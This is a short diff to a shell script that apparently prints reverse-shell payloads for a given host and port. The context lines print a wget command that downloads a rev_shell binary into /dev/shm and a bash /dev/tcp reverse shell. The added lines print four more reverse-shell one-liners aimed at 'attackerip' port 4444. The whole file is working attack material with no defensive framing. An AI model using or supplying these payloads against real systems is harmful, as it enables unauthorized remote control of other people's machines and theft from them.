@@ -56,6 +56,15 @@ printf "/usr/bin/wget http://$1:$2/rev_shell -O /dev/shm/rev_shell;chmod 777 /de
 printf "\n\n"
 printf "bash -i >& /dev/tcp/$1/$2 0>&1"
 printf '\n\n'
+
+printf "exec /bin/bash 0&0 2>&0"
+printf "\n\n"
+printf "0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196"
+printf "\n\n"
+printf "exec 5<>/dev/tcp/attackerip/4444 && cat <&5 | while read line; do $line 2>&5 >&5; done"
+printf "\n\n"
+printf "exec 5<>/dev/tcp/attackerip/4444 && while read line 0<&5; do $line 2>&5 >&5; done"
+printf "\n\n"
 }
 
 
